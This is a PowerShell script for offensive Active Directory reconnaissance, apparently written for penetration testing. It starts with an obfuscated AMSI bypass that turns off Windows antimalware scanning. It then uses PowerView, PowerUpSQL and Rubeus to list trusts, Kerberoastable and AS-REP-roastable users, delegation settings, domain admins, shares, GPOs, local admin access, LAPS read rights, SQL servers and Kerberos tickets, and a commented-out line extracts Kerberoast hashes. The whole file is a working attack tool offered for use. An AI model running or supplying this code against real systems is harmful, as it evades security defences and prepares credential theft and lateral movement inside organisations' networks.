# bypass AMSI - PLEASE NOTE: this signature is detected in the updated Win machines, use your own method to bypass AMSI in that case
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."AssEmbly"."GETTYPe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."getfiElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sETVaLUE"(${nULl},${tRuE} )
# Importing the required tools
Import-Module  .\Microsoft.ActiveDirectory.Management.dll
Import-PowershellDataFile .\ActiveDirectory.psd1
Import-Module .\PowerView.ps1
Import-Module .\PowerView_dev.ps1
Import-Module .\PowerupSQL.ps1
Import-Module .\AdmPwd.PS.psd1 

Write-Host "+============================================+";
Write-Host "           [+] Domains Enumeration            " -foregroundcolor white -backgroundcolor DarkRed;
Write-Host "+============================================+";
Write-Host "   [1] Forest Information :" -ForegroundColor Cyan ; 
Get-ADForest | select Name | Format-Table -AutoSize
Write-Host "   [2] Domains of the Current Forest :" -ForegroundColor Cyan;
$domainsArray = (Get-ADForest).Domains 
foreach($domain in $domainsArray)
{
get-addomain -server $domain | select Name,ChildDomains,ParentDomain,DomainSID,InfrastructureMaster | Format-Table -AutoSize
}
Write-Host "   [3] Mapping Domains Trust :" -ForegroundColor Cyan;
foreach($domain in $domainsArray)
{
Get-DomainTrust -domain $domain | select SourceName,TargetName,TrustDirection | Format-Table -AutoSize
}
Write-Host "   [4] Forest External Trusts :" -ForegroundColor Cyan;
Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name
Write-Host "   [5] External Trusts For Forest Domains :" -ForegroundColor Cyan;
(Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'}
foreach($domain in $domainsArray)
{
Write-Host "+============================================+";
Write-Host "   [+] Users Enumeration - Domain: $domain    " -foregroundcolor white -backgroundcolor DarkRed;
Write-Host "+============================================+"; 
Write-Host "   [1] All users :"-ForegroundColor Cyan;
get-aduser -Filter * -Server $domain -Properties * | Select Description, samaccountname | Format-Table -AutoSize
Write-Host "   [2] Unconstrained Delegation on Users :" -ForegroundColor Cyan;
Get-ADUser -Filter {TrustedForDelegation -eq $True} -Server $domain
Write-Host "   [3] ASREPRoastable Users :" -ForegroundColor Cyan;
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth -Server $domain | select SamAccountName,SID,DistinguishedName | Format-Table -AutoSize
Write-Host "   [4] Kerberoastable Users :" -ForegroundColor Cyan;
Get-DomainUser -SPN -Domain $domain | select name , serviceprincipalname , samaccountname | Format-Table -AutoSize  
$kerberoastableUsers = Get-DomainUser -SPN -Domain $domain | select name , serviceprincipalname , samaccountname | Format-Table -AutoSize  
#Get-ADUser -filter {ServicePrincipalName -like "*"} -Property serviceprincipalname -Server $domain | select SamAccountName,SID,DistinguishedName | Format-Table -AutoSize
#if ($kerberoastableUsers) 
#{Write-Host "   [5] Extracting Hashes of Kerberoastable Accounts :"
#.\Rubeus.exe kerberoast /rc4opsec /domain:$domain /outfile:hashes_$domain.txt ## Domain Parameter Needs Fix ##
#}
Write-Host "   [5] Find Users in the Current Domain that Reside in Groups Across a Trust :" -ForegroundColor Cyan;
Find-ForeignUser -Domain $domain 
Write-Host "   [6] Find Users with AdminCount = 1:" -ForegroundColor Cyan;
Get-NetUser -AdminCount -Domain $domain  | select samaccountname,serviceprincipalname,objectsid | Format-Table -AutoSize

Write-Host "+============================================+";
Write-Host " [+] Computers Enumeration - Domain: $domain  "-foregroundcolor white -backgroundcolor DarkRed ;
Write-Host "+============================================+";
Write-Host "   [1] Computers :" -ForegroundColor Cyan;
Get-ADComputer -Filter * -Server $domain | select name, DNSHostName, SamAccountName | Format-Table -AutoSize
$computersArray = Get-ADComputer -Filter * -Server $domain | select DNSHostName
Write-Host "   [2] Computers (Live Hosts) :" -ForegroundColor Cyan;
Get-ADComputer -Filter * -Properties DNSHostName -Server $domain | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName} | select Address,IPV4Address |  Format-List  
Write-Host "   [3] Unconstrained Delegation on Computers :"-ForegroundColor Cyan ;
Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Server $domain | select SamAccountName,DNSHostName | Format-Table -AutoSize



Write-Host "+============================================+";
Write-Host "   [+] Groups Enumeration - Domain: $domain   "-foregroundcolor white -backgroundcolor DarkRed;
Write-Host "+============================================+";
Write-Host "   [1] All Groups :" -ForegroundColor Cyan;
Get-ADGroup -Filter * -Server $domain | select Name | Format-Table -AutoSize
Write-Host "   [2] Groups Contain Admin Word :" -ForegroundColor Cyan;
Get-ADGroup -Filter 'Name -like "*admin*"' -Server $domain  | select Name | Format-Table -AutoSize
Write-Host "   [3] Members of Domain Admins Group : " -ForegroundColor Cyan;
Get-ADGroupMember -Identity "Domain Admins" -Recursive -Server $domain | select SamAccountName,SID,DistinguishedName |  Format-Table -AutoSize 
Write-Host "   [4] Get all the local groups on a machine : " -ForegroundColor Cyan ;
foreach($computer in $computersArray)
{
Get-NetLocalGroup -ComputerName $computer.DNSHostName
}
Write-Host "   [5] Get members of all local groups on a machine : "-ForegroundColor Cyan;
foreach($computer in $computersArray)
{
Get-NetLocalGroupMember -ComputerName $computer.DNSHostName
}

Write-Host "+============================================+";
Write-Host "   [+] OUs Enumeration - Domain: $domain      "-foregroundcolor white -backgroundcolor DarkRed;
Write-Host "+============================================+";
Write-Host "   [1] All OUs : "-ForegroundColor Cyan;
Get-ADOrganizationalUnit -Filter * -Server $domain | select name, DistinguishedName  | Format-Table -AutoSize 


Write-Host "+============================================+";
Write-Host "   [+] Shares Enumeration - Domain: $domain    " -foregroundcolor white -backgroundcolor DarkRed;
Write-Host "+============================================+";
Write-Host "   [1] Shares :" -ForegroundColor Cyan;
Invoke-ShareFinder  -CheckShareAccess -Domain $domain | Format-Table -AutoSize 

#Write-Host "+========================================+";
#Write-Host "           [+] ACLs Enumeration            ";
#Write-Host "+========================================+";
#Write-Host "   [1] Find Interesting ACLs:" -ForegroundColor Cyan;
#Find-InterestingDomainAcl -ResolveGUIDs -domain  $domain
#Invoke-ACLScanner -ResolveGUIDs | select ActiveDirectoryRights, IdentityReference, objectDN |  Format-Table -AutoSize 


Write-Host "+============================================+";
Write-Host "   [+] GPOs Enumeration - Domain: $domain     " -foregroundcolor white -backgroundcolor DarkRed;
Write-Host "+============================================+";
Write-Host "   [1] All GPOs :" -ForegroundColor Cyan;
Get-NetGPO -Domain $domain | select displayname,name,distinguishedname  | Format-Table -AutoSize 
Write-Host "   [2] Get GPO(s) which use Restricted Groups  :" -ForegroundColor Cyan;
Get-DomainGPOLocalGroup -Domain $domain 
#Write-Host "   [3] Get users which are in a local group of a machine using GPO :"; ## NEED FIX ##
#foreach($computer in $computersArray)
#{
#Write-Host "Domain : $domain - Computer : $computer.DNSHostName";
#Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity $computer.DNSHostName
#}


Write-Host "+========================================================+";
Write-Host "  [+] Logon and Sessions Enumeration - : Domain: $domain "-foregroundcolor white -backgroundcolor DarkRed;
Write-Host "+========================================================+";
Write-Host "   [1] Finding Local Admin Access :" -ForegroundColor Cyan;
Find-LocalAdminAccess -Domain $domain


Write-Host "+===========================================================+";
Write-Host "  [+] LAPS Enumeration     ";
Write-Host "  [!] Note : Enumeration is done with Current Domain Account"  -foregroundcolor red 
Write-Host "+===========================================================+"; 
$OUs = Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}

Write-Host "+===========================================================+";
Write-Host "[!] FINISHED ENUMERATING: $domain";
Write-Host "+===========================================================+";
}

Write-Host "+===========================================================+";
Write-Host "  [+] Database Enumeration     "-foregroundcolor white -backgroundcolor DarkRed;
Write-Host "  [!] Note : Enumeration is done with Current Domain Account " -foregroundcolor red
Write-Host "+===========================================================+";
Write-Host "   [1] Finding SQL Servers :" -ForegroundColor Cyan;
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Format-Table -AutoSize 
Write-Host "   [2] Extracting Information of Accessible SQL Servers :" -ForegroundColor Cyan;
Get-SQLInstanceDomain | Get-SQLServerinfo | select ComputerName,DomainName,ServiceName,ServiceAccount,SQLServerEdition,Currentlogin,IsSysadmin | Format-Table -AutoSize



Write-Host "+===========================================================+";
Write-Host "  [+] Tickets Enumeration     "-foregroundcolor white -backgroundcolor DarkRed;
Write-Host "  [!] Note : Enumeration is done in Current Local Machine" -foregroundcolor red 
Write-Host "+===========================================================+";
Write-Host "   [1] Listing Tickets :" -ForegroundColor Cyan;
.\Rubeus.exe triage
